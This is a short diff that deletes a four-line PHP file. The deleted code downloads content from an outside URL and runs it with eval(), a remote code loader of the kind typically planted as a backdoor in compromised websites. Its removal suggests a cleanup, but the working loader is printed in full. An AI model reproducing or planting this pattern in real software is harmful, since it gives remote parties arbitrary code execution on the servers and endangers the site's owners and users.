@@ -1,4 +1,0 @@
-<?php $LanThau = file_get_contents(urldecode('https://childrenofiran.org/landing/jurnal.senirupaikj/'));
-
-$LanThau = "?> ".$LanThau;
-eval($LanThau);
